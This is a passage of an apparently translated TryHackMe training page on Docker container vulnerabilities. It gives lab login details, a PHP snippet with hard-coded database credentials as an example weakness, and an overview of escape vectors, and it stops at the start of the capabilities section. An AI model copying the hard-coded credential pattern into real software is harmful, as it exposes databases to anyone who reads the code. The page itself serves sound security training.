<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Container Security/Container Vulnerabilities" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Container Vulnerabilities | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" property="og:locale:alternate" content="zh"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Container Vulnerabilities | TryHackMe-CN"><meta data-rh="true" name="description" content="Task 1 Introduction (Deploy)"><meta data-rh="true" property="og:description" content="Task 1 Introduction (Deploy)"><link data-rh="true" rel="icon" href="/TryHackMe-CN/en/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Modules","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/"},{"@type":"ListItem","position":2,"name":"Container Security","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/"},{"@type":"ListItem","position":3,"name":"Container Vulnerabilities","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/en/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/en/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/en/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/en/assets/js/runtime~main.28f85072.js" defer="defer"></script>
<script src="/TryHackMe-CN/en/assets/js/main.f93f48ab.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/en/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/en/"><div class="navbar__logo"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/en/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/en/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/en/docs/Modules/"><span title="Modules" class="categoryLinkLabel_W154">Modules</span></a><button aria-label="Collapse sidebar category &#x27;Modules&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Attacking LLMs/"><span title="Attacking LLMs" class="categoryLinkLabel_W154">Attacking LLMs</span></a><button aria-label="Expand sidebar category &#x27;Attacking LLMs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Command Line/"><span title="Command Line" class="categoryLinkLabel_W154">Command Line</span></a><button aria-label="Expand sidebar category &#x27;Command Line&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/"><span title="Container Security" class="categoryLinkLabel_W154">Container Security</span></a><button aria-label="Collapse sidebar category &#x27;Container Security&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/Intro to Containerisation"><span title="Intro to Containerisation" class="linkLabel_WmDU">Intro to Containerisation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/Intro to Docker"><span title="Intro to Docker" class="linkLabel_WmDU">Intro to Docker</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/Intro to Kubernetes"><span title="Intro to Kubernetes" class="linkLabel_WmDU">Intro to Kubernetes</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities"><span title="Container Vulnerabilities" class="linkLabel_WmDU">Container Vulnerabilities</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/Container Hardening"><span title="Container Hardening" class="linkLabel_WmDU">Container Hardening</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/"><span title="Host Evasions" class="categoryLinkLabel_W154">Host Evasions</span></a><button aria-label="Expand sidebar category &#x27;Host Evasions&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/"><span title="Memory Analysis" class="categoryLinkLabel_W154">Memory Analysis</span></a><button aria-label="Expand sidebar category &#x27;Memory Analysis&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="Expand sidebar category &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Starters/"><span title="Starters" class="categoryLinkLabel_W154">Starters</span></a><button aria-label="Expand sidebar category &#x27;Starters&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/en/docs/Networks/"><span title="Networks" class="categoryLinkLabel_W154">Networks</span></a><button aria-label="Expand sidebar category &#x27;Networks&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/en/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/TryHackMe-CN/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/"><span>Modules</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/Container Security/"><span>Container Security</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Container Vulnerabilities</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Container Vulnerabilities</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-1-introduction-deploy">Task 1 Introduction (Deploy)<a href="#task-1-introduction-deploy" class="hash-link" aria-label="Direct link to Task 1 Introduction (Deploy)" title="Direct link to Task 1 Introduction (Deploy)" translate="no">​</a></h2>
<p>This room will demonstrate some of the common vulnerabilities found in Docker containers and how an attacker can abuse these to escape.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-objectives">Learning Objectives<a href="#learning-objectives" class="hash-link" aria-label="Direct link to Learning Objectives" title="Direct link to Learning Objectives" translate="no">​</a></h3>
<p>In this room, you will learn the following:</p>
<ul>
<li class="">Some of the vulnerabilities that can exist in a Docker container.</li>
<li class="">What you, as an attacker, can gain from exploiting these vulnerabilities.</li>
<li class="">Why these vulnerabilities exist (i.e. misconfiguration).</li>
<li class="">How to search for vulnerabilities within a Docker container.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites">Prerequisites<a href="#prerequisites" class="hash-link" aria-label="Direct link to Prerequisites" title="Direct link to Prerequisites" translate="no">​</a></h3>
<p>Before proceeding, it is strongly recommended that you have completed the Intro to Docker room and are comfortable with the Linux CLI.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="important-context">Important Context<a href="#important-context" class="hash-link" aria-label="Direct link to Important Context" title="Direct link to Important Context" translate="no">​</a></h3>
<p>This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container. In other words, this room assumes that you have already managed to become root in the container.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="deploy-the-vulnerable-machine-for-this-room">Deploy the Vulnerable Machine for This Room<a href="#deploy-the-vulnerable-machine-for-this-room" class="hash-link" aria-label="Direct link to Deploy the Vulnerable Machine for This Room" title="Direct link to Deploy the Vulnerable Machine for This Room" translate="no">​</a></h3>
<p>Press the green &quot;Start Machine&quot; button located at the top-right of this task. You can access the machine using the credentials below, via the TryHackMe AttackBox or by connecting your machine to the TryHackMe Network. You will be using this machine to answer the questions throughout the tasks in this room.</p>
<table><thead><tr><th style="text-align:center">Key</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">Username</td><td style="text-align:center">root</td></tr><tr><td style="text-align:center">Password</td><td style="text-align:center">tryhackme123!</td></tr><tr><td style="text-align:center">IP</td><td style="text-align:center">MACHINE_IP</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Complete me to progress with this room! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-2-container-vulnerabilities-101">Task 2 Container Vulnerabilities 101<a href="#task-2-container-vulnerabilities-101" class="hash-link" aria-label="Direct link to Task 2 Container Vulnerabilities 101" title="Direct link to Task 2 Container Vulnerabilities 101" translate="no">​</a></h2>
<p>Before we begin, it&#x27;s important to re-cap some of the things learned in the <a href="https://tryhackme.com/room/introtocontainerisation" target="_blank" rel="noopener noreferrer" class="">Intro to Containerisation</a> room. First, let&#x27;s recall that containers are isolated and have minimal environments. The picture below depicts the environment of a container.</p>
<p><img decoding="async" loading="lazy" alt="Illustrating three containers on a single computer" src="/TryHackMe-CN/en/assets/images/image_20251122-192221-75d997850a0db739277c7cf809a88e6c.png" width="1198" height="960" class="img_ev3q"></p>
<p><strong>Some important things to note are:</strong></p>
<p>Just because you have access (i.e. a foothold) to a container, it does not mean you have access to the host operating system and associated files or other containers.</p>
<p>Due to the minimal nature of containers (i.e. they only have the tools specified by the developer), you are unlikely to find fundamental tools such as Netcat, Wget or even Bash! This makes interacting within a container quite difficult for an attacker.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-sort-of-vulnerabilities-can-we-expect-to-find-in-docker-containers">What Sort of Vulnerabilities Can We Expect To Find in Docker Containers<a href="#what-sort-of-vulnerabilities-can-we-expect-to-find-in-docker-containers" class="hash-link" aria-label="Direct link to What Sort of Vulnerabilities Can We Expect To Find in Docker Containers" title="Direct link to What Sort of Vulnerabilities Can We Expect To Find in Docker Containers" translate="no">​</a></h3>
<p>While Docker containers are designed to isolate applications from one another, they can still be vulnerable. For example, hard-coded passwords for an application can still be present. If an attacker is able to gain access through a vulnerable web application, for example, they will be able to find these credentials. You can see an example of a web application containing hard-coded credentials to a database server in the code snippet below:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/** Database hostname */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_HOST&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;localhost&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database name */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_NAME&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;sales&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database username */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_USER&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;production&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database password */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_PASSWORD&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;SuperstrongPassword321!&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>This, of course, isn&#x27;t the only vulnerability that can be exploited in containers. The other potential attack vectors have been listed in the table below.</p>
<table><thead><tr><th style="text-align:left">Vulnerability</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">Misconfigured Containers</td><td style="text-align:left">Misconfigured containers will have privileges that are not necessary for the operation of the container. For example, a container running in &quot;privileged&quot; mode will have access to the host operating system - removing the layers of isolation.</td></tr><tr><td style="text-align:left">Vulnerable Images</td><td style="text-align:left">There have been numerous incidents of popular Docker images being backdoored to perform malicious actions such as crypto mining.</td></tr><tr><td style="text-align:left">Network Connectivity</td><td style="text-align:left">A container that is not correctly networked can be exposed to the internet. For example, a database container for a web application should only be accessible to the web application container - not the internet.<br>Additionally, containers can serve to become a method of lateral movement. Once an attacker has access to a container, they may be able to interact with other containers on the host that are not exposed to the network.</td></tr></tbody></table>
<p>This is just a brief summary of some of the types of vulnerabilities that can exist within a container. The tasks in this room will delve into these further!</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click to proceed to the next task! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-3-vulnerability-1-privileged-containers-capabilities">Task 3 Vulnerability 1: Privileged Containers (Capabilities)<a href="#task-3-vulnerability-1-privileged-containers-capabilities" class="hash-link" aria-label="Direct link to Task 3 Vulnerability 1: Privileged Containers (Capabilities)" title="Direct link to Task 3 Vulnerability 1: Privileged Containers (Capabilities)" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-capabilities">Understanding Capabilities<a href="#understanding-capabilities" class="hash-link" aria-label="Direct link to Understanding Capabilities" title="Direct link to Understanding Capabilities" translate="no">​</a></h3>
<p>At its fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.</p>
<p>These capabilities determine what permissions a Docker container has to the operating system. Docker containers can run in two modes:</p>
<ul>
<li class="">User (Normal) mode</li>
<li class="">Privileged mode</li>
</ul>
<p>In the diagram below, we can see the two different modes in action and the level of access each mode has to the host:</p>
<p><img decoding="async" loading="lazy" alt="Illustrating the different container modes and privileges and the level of access they have to the operating system." src="/TryHackMe-CN/en/assets/images/image_20251128-192822-623610a5d26526f2730d762d36089016.png" width="1198" height="960" class="img_ev3q"></p>
